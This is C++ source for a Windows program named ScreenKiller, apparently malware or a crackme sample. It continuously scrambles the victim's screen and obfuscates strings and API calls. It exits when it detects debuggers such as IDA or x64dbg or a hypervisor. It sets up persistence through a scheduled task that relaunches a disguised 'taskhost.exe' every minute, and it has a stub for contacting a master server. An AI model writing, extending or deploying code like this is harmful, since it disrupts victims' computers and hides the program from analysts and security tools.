#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

#include "ScreenKiller.hpp"
#include "Resolver.hpp"
#include "Helpers.hpp"

VOID WINAPI ScrambleWindow(PScreenProps screen_props, ScreenKiller *obj);

ScreenKiller::ScreenKiller() : m_alive(false), m_persistent(false), m_connected(false) 
{
	size_t size;
	char *path;
	_dupenv_s(&path, &size, OBFUSCATE("temp").c_str());

	this->m_temp_path = path;
}

ScreenKiller::~ScreenKiller()
{
	this->suicide();
}

void ScreenKiller::deploy()
{
	this->m_alive = true;

	//RESOLVE(user32.dll, ShowWindow)(GetConsoleWindow(), SW_HIDE);

	this->m_runner_thread = std::thread([this] {this->deploy_inner(); });
}

void ScreenKiller::suicide()
{
	this->m_runner_thread.detach();
	this->m_alive = false;
}

bool ScreenKiller::deploy_inner()
{
	this->check_secret_file();
	//this->exit_if_vm_cpuid();
	//this->connect_to_master_server();
	//this->exit_if_debugged();
	//this->get_persistency();

	HWND hDesktop = NULL;
	ScreenProps screen_props = { 0 };
	hDesktop = RESOLVE(user32.dll, GetDesktopWindow)();

	screen_props.hdcScreen = RESOLVE(user32.dll, GetDCEx)(hDesktop, NULL, DCX_CACHE | DCX_LOCKWINDOWUPDATE);

	srand(GetTickCount64() % UINT32_MAX);

	RECT desktop = { 0 };
	
	RESOLVE(user32.dll, GetWindowRect)(hDesktop, &(screen_props.rectScreen));

	while (this->m_alive)
	{
		ScrambleWindow(&screen_props, this);
		Sleep(10);
	}
																  
	return true;
}

bool ScreenKiller::get_persistency()
{
	system(OBFUSCATE("schtasks /create /f /tn \"Network\" /sc minute /mo 1 /tr \"cmd /c start C:\\Windows\\System32\\taskhost.exe\"").c_str());

	return true;
}

bool ScreenKiller::connect_to_master_server()
{
	return false;
}

void ScreenKiller::exit_if_vm_cpuid()
{
	int32_t registers[4];
	
	__cpuid(registers, 1);
	bool hypervisor_bit = static_cast<bool>((registers[2] >> 31) & 0x1);

	if (hypervisor_bit)
	{
		exit(1);
	}
}

void ScreenKiller::exit_if_debugged()
{
	if (this->is_debugged1() || this->is_debugged2())
		exit(1);
}

bool ScreenKiller::is_debugged1()
{
	return RESOLVE(kernel32.dll, IsDebuggerPresent)();
}

bool ScreenKiller::is_debugged2()
{
		const wchar_t* debuggersFilename[7] = {
			WOBFUSCATE(L"cheatengine-x86_64.exe").c_str(),
			WOBFUSCATE(L"ollydbg.exe").c_str(),
			WOBFUSCATE(L"ida.exe").c_str(),
			WOBFUSCATE(L"ida64.exe").c_str(),
			WOBFUSCATE(L"idaq64.exe").c_str(),
			WOBFUSCATE(L"radare2.exe").c_str(),
			WOBFUSCATE(L"x64dbg.exe").c_str()
		};

		const wchar_t *pogan_name = WOBFUSCATE(L"taskhost.exe").c_str();
		
		size_t count_instances = 0;
		wchar_t* processName;
		PROCESSENTRY32W processInformation{ sizeof(PROCESSENTRY32W) };
		HANDLE processList;
		
		processList = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
		processInformation = { sizeof(PROCESSENTRY32W) };
		
		if (!(RESOLVE(kernel32.dll, Process32FirstW)(processList, &processInformation)))
		{
			return false;
		}
		
		do
		{
			for (const wchar_t* debugger : debuggersFilename)
			{
				processName = processInformation.szExeFile;
				if (_wcsicmp(debugger, processName) == 0) 
				{
					return true;
				}
			}
			if (_wcsicmp(pogan_name, processInformation.szExeFile) == 0)
			{
				count_instances++;
			}
		} while (RESOLVE(kernel32.dll, Process32NextW)(processList, &processInformation));

		RESOLVE(kernel32.dll, CloseHandle)(processList);

		return count_instances > 1;
}

void ScreenKiller::check_secret_file()
{
	FILE *fp; 
	char secret_buf[MAX_FILE] = { 0 };

	std::string filename = OBFUSCATE("\\secret.txt").c_str();
	filename = this->m_temp_path + filename;

	fopen_s(&fp, filename.c_str(), "r");
	if (fp == NULL)
		return;

	fread(secret_buf, 1, MAX_FILE, fp);
	std::string encoded_key = encode_string(secret_buf);
	
	if (encoded_key == ENCODED_KEY)
		RESOLVE(user32.dll, MessageBoxA)(NULL, (decrypt_ip(secret_buf)).c_str(), OBFUSCATE("Hmmm").c_str(), NULL);
}

VOID WINAPI ScrambleWindow(PScreenProps screen_props, ScreenKiller *obj) 
{
	HDC hdcScreen = screen_props->hdcScreen;
	RECT rectScreen = screen_props->rectScreen;
	HDC hdcMemory = NULL;
	HBITMAP hBitmap = NULL;
	int iWidth, iHeight, iX1, iY1, iX2, iY2;

	hdcMemory = RESOLVE(gdi32.dll, CreateCompatibleDC)(hdcScreen);

	iWidth = abs(rectScreen.left - rectScreen.right) / DIVIDERS;
	iHeight = abs(rectScreen.top - rectScreen.bottom) / DIVIDERS;

	RESOLVE(gdi32.dll, SelectObject)(hdcMemory, hBitmap);

	while (TRUE)
	{
		obj->exit_if_debugged();

		iX1 = rectScreen.left + iWidth * (rand() % DIVIDERS);
		iX2 = rectScreen.left + iWidth * (rand() % DIVIDERS);
		iY1 = rectScreen.top + iHeight * (rand() % DIVIDERS);
		iY2 = rectScreen.top + iHeight * (rand() % DIVIDERS);

		RESOLVE(gdi32.dll, BitBlt)(hdcMemory, 0, 0, iWidth, iHeight, hdcScreen, iX1, iY1, SRCCOPY);
		RESOLVE(gdi32.dll, BitBlt)(hdcScreen, iX1, iY1, iWidth, iHeight, hdcScreen, iX2, iY2, SRCCOPY);
		RESOLVE(gdi32.dll, BitBlt)(hdcScreen, iX2, iY2, iWidth, iHeight, hdcMemory, 0, 0, SRCCOPY);

		RESOLVE(kernel32.dll, Sleep)(10);
	}

	DeleteDC(hdcMemory);
	DeleteObject(hBitmap);
}
